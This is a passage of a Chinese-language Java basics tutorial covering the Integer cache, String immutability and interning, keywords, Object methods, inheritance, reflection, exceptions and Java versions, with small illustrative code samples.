方法，因此多个值相同且值在缓存池范围内的 Integer 实例使用自动装箱来创建，那么就会引用相同的对象。\nInteger m = 123; Integer n = 123; System.out.println(m == n); // true 基本类型对应的缓冲池如下：\n boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \\u0000 to \\u007F  在使用这些基本类型对应的包装类型时，如果该数值范围在缓冲池范围内，就可以直接使用缓冲池中的对象。\n在 jdk 1.8 所有的数值类缓冲池中，Integer 的缓冲池 IntegerCache 很特殊，这个缓冲池的下界是 - 128，上界默认是 127，但是这个上界是可调的，在启动 jvm 的时候，通过 -XX:AutoBoxCacheMax=\u0026lt;size\u0026gt; 来指定这个缓冲池的大小，该选项在 JVM 初始化的时候会设定一个名为 java.lang.IntegerCache.high 系统属性，然后 IntegerCache 初始化的时候就会读取该系统属性来决定上界。\nStackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 \n二、String    概览    String 被声明为 final，因此它不可被继承。(Integer 等包装类也不能被继承）\n在 Java 8 中，String 内部使用 char 数组存储数据。\npublic final class String implements java.io.Serializable, Comparable\u0026lt;String\u0026gt;, CharSequence { /** The value is used for character storage. */ private final char value[]; } 在 Java 9 之后，String 类的实现改用 byte 数组存储字符串，同时使用 coder 来标识使用了哪种编码。\npublic final class String implements java.io.Serializable, Comparable\u0026lt;String\u0026gt;, CharSequence { /** The value is used for character storage. */ private final byte[] value; /** The identifier of the encoding used to encode the bytes in {@code value}. */ private final byte coder; } value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。\n不可变的好处    1. 可以缓存 hash 值\n因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。\n2. String Pool 的需要\n如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。\n\n3. 安全性\nString 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 的那一方以为现在连接的是其它主机，而实际情况却不一定是。\n4. 线程安全\nString 不可变性天生具备线程安全，可以在多个线程中安全地使用。\nProgram Creek : Why String is immutable in Java?\nString, StringBuffer and StringBuilder    1. 可变性\n String 不可变 StringBuffer 和 StringBuilder 可变  2. 线程安全\n String 不可变，因此是线程安全的 StringBuilder 不是线程安全的 StringBuffer 是线程安全的，内部使用 synchronized 进行同步  StackOverflow : String, StringBuffer, and StringBuilder\nString Pool    字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定。不仅如此，还可以使用 String 的 intern() 方法在运行过程将字符串添加到 String Pool 中。\n当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。\n下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 和 s2.intern() 方法取得同一个字符串引用。intern() 首先把 \u0026ldquo;aaa\u0026rdquo; 放到 String Pool 中，然后返回这个字符串引用，因此 s3 和 s4 引用的是同一个字符串。\nString s1 = new String(\u0026#34;aaa\u0026#34;); String s2 = new String(\u0026#34;aaa\u0026#34;); System.out.println(s1 == s2); // false String s3 = s1.intern(); String s4 = s2.intern(); System.out.println(s3 == s4); // true 如果是采用 \u0026ldquo;bbb\u0026rdquo; 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。\nString s5 = \u0026#34;bbb\u0026#34;; String s6 = \u0026#34;bbb\u0026#34;; System.out.println(s5 == s6); // true 在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。\n StackOverflow : What is String interning? 深入解析 String#intern  new String(\u0026ldquo;abc\u0026rdquo;)    使用这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 \u0026ldquo;abc\u0026rdquo; 字符串对象）。\n \u0026ldquo;abc\u0026rdquo; 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个 \u0026ldquo;abc\u0026rdquo; 字符串字面量； 而使用 new 的方式会在堆中创建一个字符串对象。  创建一个测试类，其 main 方法中使用这种方式来创建字符串对象。\npublic class NewStringTest { public static void main(String[] args) { String s = new String(\u0026#34;abc\u0026#34;); } } 使用 javap -verbose 进行反编译，得到以下内容：\n// ... Constant pool: // ...  #2 = Class #18 // java/lang/String  #3 = String #19 // abc // ...  #18 = Utf8 java/lang/String #19 = Utf8 abc // ...  public static void main(java.lang.String[]); descriptor: ([Ljava/lang/String;)V flags: ACC_PUBLIC, ACC_STATIC Code: stack=3, locals=2, args_size=1 0: new #2 // class java/lang/String  3: dup 4: ldc #3 // String abc  6: invokespecial #4 // Method java/lang/String.\u0026#34;\u0026lt;init\u0026gt;\u0026#34;:(Ljava/lang/String;)V  9: astore_1 // ... 在 Constant Pool 中，#19 存储这字符串字面量 \u0026ldquo;abc\u0026rdquo;，#3 是 String Pool 的字符串对象，它指向 #19 这个字符串字面量。在 main 方法中，0: 行使用 new #2 在堆中创建一个字符串对象，并且使用 ldc #3 将 String Pool 中的字符串对象作为 String 构造函数的参数。\n以下是 String 构造函数的源码，可以看到，在将一个字符串对象作为另一个字符串对象的构造函数参数时，并不会完全复制 value 数组内容，而是都会指向同一个 value 数组。\npublic String(String original) { this.value = original.value; this.hash = original.hash; } 三、运算    参数传递    Java 的参数是以值传递的形式传入方法中，而不是引用传递。\n以下代码中 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。\npublic class Dog { String name; Dog(String name) { this.name = name; } String getName() { return this.name; } void setName(String name) { this.name = name; } String getObjectAddress() { return super.toString(); } } 在方法中改变对象的字段值会改变原对象该字段值，因为引用的是同一个对象。\nclass PassByValueExample { public static void main(String[] args) { Dog dog = new Dog(\u0026#34;A\u0026#34;); func(dog); System.out.println(dog.getName()); // B  } private static void func(Dog dog) { dog.setName(\u0026#34;B\u0026#34;); } } 但是在方法中将指针引用了其它对象，那么此时方法里和方法外的两个指针指向了不同的对象，在一个指针改变其所指向对象的内容对另一个指针所指向的对象没有影响。\npublic class PassByValueExample { public static void main(String[] args) { Dog dog = new Dog(\u0026#34;A\u0026#34;); System.out.println(dog.getObjectAddress()); // Dog@4554617c  func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c  System.out.println(dog.getName()); // A  } private static void func(Dog dog) { System.out.println(dog.getObjectAddress()); // Dog@4554617c  dog = new Dog(\u0026#34;B\u0026#34;); System.out.println(dog.getObjectAddress()); // Dog@74a14482  System.out.println(dog.getName()); // B  } } StackOverflow: Is Java “pass-by-reference” or “pass-by-value”?\nfloat 与 double    Java 不能隐式执行向下转型，因为这会使得精度降低。\n1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是向下转型。\n// float f = 1.1; 1.1f 字面量才是 float 类型。\nfloat f = 1.1f; 隐式类型转换    因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型向下转型为 short 类型。\nshort s1 = 1; // s1 = s1 + 1; 但是使用 += 或者 ++ 运算符会执行隐式类型转换。\ns1 += 1; s1++; 上面的语句相当于将 s1 + 1 的计算结果进行了向下转型：\ns1 = (short) (s1 + 1); StackOverflow : Why don\u0026rsquo;t Java\u0026rsquo;s +=, -=, *=, /= compound assignment operators require casting?\nswitch    从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。\nString s = \u0026#34;a\u0026#34;; switch (s) { case \u0026#34;a\u0026#34;: System.out.println(\u0026#34;aaa\u0026#34;); break; case \u0026#34;b\u0026#34;: System.out.println(\u0026#34;bbb\u0026#34;); break; } switch 不支持 long、float、double，是因为 switch 的设计初衷是对那些只有少数几个值的类型进行等值判断，如果值过于复杂，那么还是用 if 比较合适。\n// long x = 111; // switch (x) { // Incompatible types. Found: \u0026#39;long\u0026#39;, required: \u0026#39;char, byte, short, int, Character, Byte, Short, Integer, String, or an enum\u0026#39; // case 111: // System.out.println(111); // break; // case 222: // System.out.println(222); // break; // } StackOverflow : Why can\u0026rsquo;t your switch statement data type be long, Java?\n四、关键字    final    1. 数据\n声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。\n 对于基本类型，final 使数值不变； 对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。  final int x = 1; // x = 2; // cannot assign value to final variable \u0026#39;x\u0026#39; final A y = new A(); y.a = 1; 2. 方法\n声明方法不能被子类重写。\nprivate 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。\n3. 类\n声明类不允许被继承。\nstatic    1. 静态变量\n 静态变量：又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。 实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。  public class A { private int x; // 实例变量  private static int y; // 静态变量  public static void main(String[] args) { // int x = A.x; // Non-static field \u0026#39;x\u0026#39; cannot be referenced from a static context  A a = new A(); int x = a.x; int y = A.y; } } 2. 静态方法\n静态方法在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。\npublic abstract class A { public static void func1(){ } // public abstract static void func2(); // Illegal combination of modifiers: \u0026#39;abstract\u0026#39; and \u0026#39;static\u0026#39; } 只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字，因为这两个关键字与具体对象关联。\npublic class A { private static int x; private int y; public static void func1(){ int a = x; // int b = y; // Non-static field \u0026#39;y\u0026#39; cannot be referenced from a static context  // int b = this.y; // \u0026#39;A.this\u0026#39; cannot be referenced from a static context  } } 3. 静态语句块\n静态语句块在类初始化时运行一次。\npublic class A { static { System.out.println(\u0026#34;123\u0026#34;); } public static void main(String[] args) { A a1 = new A(); A a2 = new A(); } } 123 4. 静态内部类\n非静态内部类依赖于外部类的实例，也就是说需要先创建外部类实例，才能用这个实例去创建非静态内部类。而静态内部类不需要。\npublic class OuterClass { class InnerClass { } static class StaticInnerClass { } public static void main(String[] args) { // InnerClass innerClass = new InnerClass(); // \u0026#39;OuterClass.this\u0026#39; cannot be referenced from a static context  OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); } } 静态内部类不能访问外部类的非静态的变量和方法。\n5. 静态导包\n在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。\nimport static com.xxx.ClassName.* 6. 初始化顺序\n静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。\npublic static String staticField = \u0026#34;静态变量\u0026#34;; static { System.out.println(\u0026#34;静态语句块\u0026#34;); } public String field = \u0026#34;实例变量\u0026#34;; { System.out.println(\u0026#34;普通语句块\u0026#34;); } 最后才是构造函数的初始化。\npublic InitialOrderTest() { System.out.println(\u0026#34;构造函数\u0026#34;); } 存在继承的情况下，初始化顺序为：\n 父类（静态变量、静态语句块） 子类（静态变量、静态语句块） 父类（实例变量、普通语句块） 父类（构造函数） 子类（实例变量、普通语句块） 子类（构造函数）  五、Object 通用方法    概览    public native int hashCode() public boolean equals(Object obj) protected native Object clone() throws CloneNotSupportedException public String toString() public final native Class\u0026lt;?\u0026gt; getClass() protected void finalize() throws Throwable {} public final native void notify() public final native void notifyAll() public final native void wait(long timeout) throws InterruptedException public final void wait(long timeout, int nanos) throws InterruptedException public final void wait() throws InterruptedException equals()    1. 等价关系\n两个对象具有等价关系，需要满足以下五个条件：\nⅠ 自反性\nx.equals(x); // true Ⅱ 对称性\nx.equals(y) == y.equals(x); // true Ⅲ 传递性\nif (x.equals(y) \u0026amp;\u0026amp; y.equals(z)) x.equals(z); // true; Ⅳ 一致性\n多次调用 equals() 方法结果不变\nx.equals(y) == x.equals(y); // true Ⅴ 与 null 的比较\n对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false\nx.equals(null); // false; 2. 等价与相等\n 对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。 对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。  Integer x = new Integer(1); Integer y = new Integer(1); System.out.println(x.equals(y)); // true System.out.println(x == y); // false 3. 实现\n 检查是否为同一个对象的引用，如果是直接返回 true； 检查是否是同一个类型，如果不是，直接返回 false； 将 Object 对象进行转型； 判断每个关键域是否相等。  public class EqualExample { private int x; private int y; private int z; public EqualExample(int x, int y, int z) { this.x = x; this.y = y; this.z = z; } @Override public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; } } hashCode()    hashCode() 返回哈希值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价，这是因为计算哈希值具有随机性，两个值不同的对象可能计算出相同的哈希值。\n在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象哈希值也相等。\nHashSet 和 HashMap 等集合类使用了 hashCode() 方法来计算对象应该存储的位置，因此要将对象添加到这些集合类中，需要让对应的类实现 hashCode() 方法。\n下面的代码中，新建了两个等价的对象，并将它们添加到 HashSet 中。我们希望将这两个对象当成一样的，只在集合中添加一个对象。但是 EqualExample 没有实现 hashCode() 方法，因此这两个对象的哈希值是不同的，最终导致集合添加了两个等价的对象。\nEqualExample e1 = new EqualExample(1, 1, 1); EqualExample e2 = new EqualExample(1, 1, 1); System.out.println(e1.equals(e2)); // true HashSet\u0026lt;EqualExample\u0026gt; set = new HashSet\u0026lt;\u0026gt;(); set.add(e1); set.add(e2); System.out.println(set.size()); // 2 理想的哈希函数应当具有均匀性，即不相等的对象应当均匀分布到所有可能的哈希值上。这就要求了哈希函数要把所有域的值都考虑进来。可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。\nR 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位，最左边的位丢失。并且一个数与 31 相乘可以转换成移位和减法：31*x == (x\u0026lt;\u0026lt;5)-x，编译器会自动进行这个优化。\n@Override public int hashCode() { int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result; } toString()    默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。\npublic class ToStringExample { private int number; public ToStringExample(int number) { this.number = number; } } ToStringExample example = new ToStringExample(123); System.out.println(example.toString()); ToStringExample@4554617c clone()    1. cloneable\nclone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。\npublic class CloneExample { private int a; private int b; } CloneExample e1 = new CloneExample(); // CloneExample e2 = e1.clone(); // \u0026#39;clone()\u0026#39; has protected access in \u0026#39;java.lang.Object\u0026#39; 重写 clone() 得到以下实现：\npublic class CloneExample { private int a; private int b; @Override public CloneExample clone() throws CloneNotSupportedException { return (CloneExample)super.clone(); } } CloneExample e1 = new CloneExample(); try { CloneExample e2 = e1.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } java.lang.CloneNotSupportedException: CloneExample 以上抛出了 CloneNotSupportedException，这是因为 CloneExample 没有实现 Cloneable 接口。\n应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。\npublic class CloneExample implements Cloneable { private int a; private int b; @Override public Object clone() throws CloneNotSupportedException { return super.clone(); } } 2. 浅拷贝\n拷贝对象和原始对象的引用类型引用同一个对象。\npublic class ShallowCloneExample implements Cloneable { private int[] arr; public ShallowCloneExample() { arr = new int[10]; for (int i = 0; i \u0026lt; arr.length; i++) { arr[i] = i; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } @Override protected ShallowCloneExample clone() throws CloneNotSupportedException { return (ShallowCloneExample) super.clone(); } } ShallowCloneExample e1 = new ShallowCloneExample(); ShallowCloneExample e2 = null; try { e2 = e1.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } e1.set(2, 222); System.out.println(e2.get(2)); // 222 3. 深拷贝\n拷贝对象和原始对象的引用类型引用不同对象。\npublic class DeepCloneExample implements Cloneable { private int[] arr; public DeepCloneExample() { arr = new int[10]; for (int i = 0; i \u0026lt; arr.length; i++) { arr[i] = i; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } @Override protected DeepCloneExample clone() throws CloneNotSupportedException { DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i \u0026lt; arr.length; i++) { result.arr[i] = arr[i]; } return result; } } DeepCloneExample e1 = new DeepCloneExample(); DeepCloneExample e2 = null; try { e2 = e1.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } e1.set(2, 222); System.out.println(e2.get(2)); // 2 4. clone() 的替代方案\n使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。\npublic class CloneConstructorExample { private int[] arr; public CloneConstructorExample() { arr = new int[10]; for (int i = 0; i \u0026lt; arr.length; i++) { arr[i] = i; } } public CloneConstructorExample(CloneConstructorExample original) { arr = new int[original.arr.length]; for (int i = 0; i \u0026lt; original.arr.length; i++) { arr[i] = original.arr[i]; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } } CloneConstructorExample e1 = new CloneConstructorExample(); CloneConstructorExample e2 = new CloneConstructorExample(e1); e1.set(2, 222); System.out.println(e2.get(2)); // 2 六、继承    访问权限    Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。\n可以对类或类中的成员（字段和方法）加上访问修饰符。\n 类可见表示其它类可以用这个类创建实例对象。 成员可见表示其它类可以用这个类的实例对象访问到该成员；  protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。\n设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。\n如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例去代替，也就是确保满足里氏替换原则。\n字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。\npublic class AccessExample { public String id; } 可以使用公有的 getter 和 setter 方法来替换公有字段，这样的话就可以控制对字段的修改行为。\npublic class AccessExample { private int id; public String getId() { return id + \u0026#34;\u0026#34;; } public void setId(String id) { this.id = Integer.valueOf(id); } } 但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。\npublic class AccessWithInnerClassExample { private class InnerClass { int x; } private InnerClass innerClass; public AccessWithInnerClassExample() { innerClass = new InnerClass(); } public int getValue() { return innerClass.x; // 直接访问  } } 抽象类与接口    1. 抽象类\n抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。\n抽象类和普通类最大的区别是，抽象类不能被实例化，只能被继承。\npublic abstract class AbstractClassExample { protected int x; private int y; public abstract void func1(); public void func2() { System.out.println(\u0026#34;func2\u0026#34;); } } public class AbstractExtendClassExample extends AbstractClassExample { @Override public void func1() { System.out.println(\u0026#34;func1\u0026#34;); } } // AbstractClassExample ac1 = new AbstractClassExample(); // \u0026#39;AbstractClassExample\u0026#39; is abstract; cannot be instantiated AbstractClassExample ac2 = new AbstractExtendClassExample(); ac2.func1(); 2. 接口\n接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。\n从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类，让它们都实现新增的方法。\n接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。从 Java 9 开始，允许将方法定义为 private，这样就能定义某些复用的代码又不会把方法暴露出去。\n接口的字段默认都是 static 和 final 的。\npublic interface InterfaceExample { void func1(); default void func2(){ System.out.println(\u0026#34;func2\u0026#34;); } int x = 123; // int y; // Variable \u0026#39;y\u0026#39; might not have been initialized  public int z = 0; // Modifier \u0026#39;public\u0026#39; is redundant for interface fields  // private int k = 0; // Modifier \u0026#39;private\u0026#39; not allowed here  // protected int l = 0; // Modifier \u0026#39;protected\u0026#39; not allowed here  // private void fun3(); // Modifier \u0026#39;private\u0026#39; not allowed here } public class InterfaceImplementExample implements InterfaceExample { @Override public void func1() { System.out.println(\u0026#34;func1\u0026#34;); } } // InterfaceExample ie1 = new InterfaceExample(); // \u0026#39;InterfaceExample\u0026#39; is abstract; cannot be instantiated InterfaceExample ie2 = new InterfaceImplementExample(); ie2.func1(); System.out.println(InterfaceExample.x); 3. 比较\n 从设计层面上看，抽象类提供了一种 IS-A 关系，需要满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。 从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。 接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。 接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。  4. 使用选择\n使用接口：\n 需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Comparable 接口中的 compareTo() 方法； 需要使用多重继承。  使用抽象类：\n 需要在几个相关的类中共享代码。 需要能控制继承来的成员的访问权限，而不是都为 public。 需要继承非静态和非常量字段。  在很多情况下，接口优先于抽象类。因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。\n Abstract Methods and Classes 深入理解 abstract class 和 interface When to Use Abstract Class and Interface Java 9 Private Methods in Interfaces  super     访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而委托父类完成一些初始化的工作。应该注意到，子类一定会调用父类的构造函数来完成初始化工作，一般是调用父类的默认构造函数，如果子类需要调用父类其它构造函数，那么就可以使用 super() 函数。 访问父类的成员：如果子类重写了父类的某个方法，可以通过使用 super 关键字来引用父类的方法实现。  public class SuperExample { protected int x; protected int y; public SuperExample(int x, int y) { this.x = x; this.y = y; } public void func() { System.out.println(\u0026#34;SuperExample.func()\u0026#34;); } } public class SuperExtendExample extends SuperExample { private int z; public SuperExtendExample(int x, int y, int z) { super(x, y); this.z = z; } @Override public void func() { super.func(); System.out.println(\u0026#34;SuperExtendExample.func()\u0026#34;); } } SuperExample e = new SuperExtendExample(1, 2, 3); e.func(); SuperExample.func() SuperExtendExample.func() Using the Keyword super\n重写与重载    1. 重写（Override）\n存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法。\n为了满足里式替换原则，重写有以下三个限制：\n 子类方法的访问权限必须大于等于父类方法； 子类方法的返回类型必须是父类方法返回类型或为其子类型。 子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。  使用 @Override 注解，可以让编译器帮忙检查是否满足上面的三个限制条件。\n下面的示例中，SubClass 为 SuperClass 的子类，SubClass 重写了 SuperClass 的 func() 方法。其中：\n 子类方法访问权限为 public，大于父类的 protected。 子类的返回类型为 ArrayList\u0026lt;Integer\u0026gt;，是父类返回类型 List\u0026lt;Integer\u0026gt; 的子类。 子类抛出的异常类型为 Exception，是父类抛出异常 Throwable 的子类。 子类重写方法使用 @Override 注解，从而让编译器自动检查是否满足限制条件。  class SuperClass { protected List\u0026lt;Integer\u0026gt; func() throws Throwable { return new ArrayList\u0026lt;\u0026gt;(); } } class SubClass extends SuperClass { @Override public ArrayList\u0026lt;Integer\u0026gt; func() throws Exception { return new ArrayList\u0026lt;\u0026gt;(); } } 在调用一个方法时，先从本类中查找看是否有对应的方法，如果没有再到父类中查看，看是否从父类继承来。否则就要对参数进行转型，转成父类之后看是否有对应的方法。总的来说，方法调用的优先级为：\n this.func(this) super.func(this) this.func(super) super.func(super)  /* A | B | C | D */ class A { public void show(A obj) { System.out.println(\u0026#34;A.show(A)\u0026#34;); } public void show(C obj) { System.out.println(\u0026#34;A.show(C)\u0026#34;); } } class B extends A { @Override public void show(A obj) { System.out.println(\u0026#34;B.show(A)\u0026#34;); } } class C extends B { } class D extends C { } public static void main(String[] args) { A a = new A(); B b = new B(); C c = new C(); D d = new D(); // 在 A 中存在 show(A obj)，直接调用  a.show(a); // A.show(A)  // 在 A 中不存在 show(B obj)，将 B 转型成其父类 A  a.show(b); // A.show(A)  // 在 B 中存在从 A 继承来的 show(C obj)，直接调用  b.show(c); // A.show(C)  // 在 B 中不存在 show(D obj)，但是存在从 A 继承来的 show(C obj)，将 D 转型成其父类 C  b.show(d); // A.show(C)  // 引用的还是 B 对象，所以 ba 和 b 的调用结果一样  A ba = new B(); ba.show(c); // A.show(C)  ba.show(d); // A.show(C) } 2. 重载（Overload）\n存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。\n应该注意的是，返回值不同，其它都相同不算是重载。\nclass OverloadingExample { public void show(int x) { System.out.println(x); } public void show(int x, String y) { System.out.println(x + \u0026#34; \u0026#34; + y); } } public static void main(String[] args) { OverloadingExample example = new OverloadingExample(); example.show(1); example.show(1, \u0026#34;2\u0026#34;); } 七、反射    每个类都有一个 Class 对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。\n类加载相当于 Class 对象的加载，类在第一次使用时才动态加载到 JVM 中。也可以使用 Class.forName(\u0026quot;com.mysql.jdbc.Driver\u0026quot;) 这种方式来控制类的加载，该方法会返回一个 Class 对象。\n反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。\nClass 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类：\n Field ：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段； Method ：可以使用 invoke() 方法调用与 Method 对象关联的方法； Constructor ：可以用 Constructor 的 newInstance() 创建新的对象。  反射的优点：\n 可扩展性 ：应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。 类浏览器和可视化开发环境 ：一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。 调试器和测试工具 ： 调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。  反射的缺点：\n尽管反射非常强大，但也不能滥用。如果一个功能可以不用反射完成，那么最好就不用。在我们使用反射技术时，下面几条内容应该牢记于心。\n  性能开销 ：反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。\n  安全限制 ：使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet，那么这就是个问题了。\n  内部暴露 ：由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。\n  Trail: The Reflection API\n  深入解析 Java 反射（1）- 基础\n  八、异常    Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： Error 和 Exception。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种：\n 受检异常 ：需要用 try\u0026hellip;catch\u0026hellip; 语句捕获并进行处理，并且可以从异常中恢复； 非受检异常 ：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序崩溃并且无法恢复。  \n  Java Exception Interview Questions and Answers\n  Java提高篇——Java 异常处理\n  九、泛型    public class Box\u0026lt;T\u0026gt; { // T stands for \u0026#34;Type\u0026#34;  private T t; public void set(T t) { this.t = t; } public T get() { return t; } }  Java 泛型详解 10 道 Java 泛型面试题  十、注解    Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。\n注解 Annotation 实现原理与自定义注解例子\n十一、特性    Java 各版本的新特性    New highlights in Java SE 8\n Lambda Expressions Pipelines and Streams Date and Time API Default Methods Type Annotations Nashhorn JavaScript Engine Concurrent Accumulators Parallel operations PermGen Error Removed  New highlights in Java SE 7\n Strings in Switch Statement Type Inference for Generic Instance Creation Multiple Exception Handling Support for Dynamic Languages Try with Resources Java nio Package Binary Literals, Underscore in literals Diamond Syntax   Difference between Java 1.8 and Java 1.7? Java 8 特性  Java 与 C++ 的区别     Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。 Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。 Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。 Java 支持自动垃圾回收，而 C++ 需要手动回收。 